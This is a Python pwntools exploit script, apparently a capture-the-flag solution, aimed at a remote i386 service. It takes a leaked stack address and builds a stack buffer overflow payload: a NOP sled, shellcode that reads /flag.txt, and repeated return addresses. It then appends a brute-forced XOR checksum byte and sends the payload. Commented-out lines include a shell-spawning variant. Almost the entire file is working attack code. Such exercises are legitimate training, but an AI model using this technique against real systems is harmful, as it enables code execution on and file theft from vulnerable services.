from pwn import *
import re
import sys

def create_shellcode(addr_str):
    # addr_str = '0x01020304'
    output_fd = 1
    buffer_size = 1024
    addr_enc = p32(int(addr_str, 16))

    print(repr(addr_enc))

    assembly = shellcraft.i386.linux.readfile("/flag.txt", output_fd) + shellcraft.i386.linux.exit()
    shellcode = asm(assembly, arch = 'i386', os = 'linux')

    nop_size = int((buffer_size - len(shellcode)) / 2)
    print(nop_size)

    shellcode = asm(shellcraft.i386.nop()) * (nop_size + 3) + shellcode + addr_enc * (int((nop_size / 4)) + 4)

    print(f"Testing shellcode of len {len(shellcode)}")
    p = run_shellcode(shellcode, arch = 'i386', os = 'linux')
    print(p.recvall())
    return shellcode


def compute_checksum(buffer, m):
    checksum = 0
    for b in buffer:
        checksum = checksum ^ b
    checksum = checksum ^ m
    return checksum


context(arch='i386', os='linux')
context.log_level = 'debug'
conn = remote(sys.argv[1], sys.argv[2])
conn.recvuntil(b"Your service ticket id is: ")
address_string = conn.recvline().strip()
shellcode = create_shellcode(address_string)

#sys.exit(0)
#address = int(address_string, 16)

#buffer_size = 1024
#nop_sled = 512
#print(f"Using address string: {address_string}")
#shellcode = asm(shellcraft.sh())

#shellcode_asm = shellcraft.open('/flag.txt', 0)  # 0 is the flag for O_RDONLY
#shellcode_asm += shellcraft.read('eax', 'esp', 100)  # Read up to 100 bytes from file descriptor into the stack
#shellcode_asm += shellcraft.write(1, 'esp', 100)  # Write up to 100 bytes to STDOUT

# Generate the shellcode
#shellcode = asm(shellcode_asm)

print(f"Shellcode is {len(shellcode)} bytes long")

#ret_address_length = int(((buffer_size - nop_sled - len(shellcode)) / 4) + 6)
#print(f"Ret address reps: {ret_address_length}")
#buffer = (asm('nop') * nop_sled) + shellcode + (p32(address) * ret_address_length)
#print(f"The buffer is: {len(buffer)}")

# Checks the sum
for m in range(255):
    res = compute_checksum(shellcode, m)
    if res == 0:
        break

print(f"Magic value is {m}")
shellcode = shellcode + m.to_bytes(1, 'little')
print(f"The buffer is: {len(shellcode)}")
print(repr(shellcode))
input("Press Enter when ready.")
conn.sendline(shellcode)
print(conn.recvall())

#conn.close()

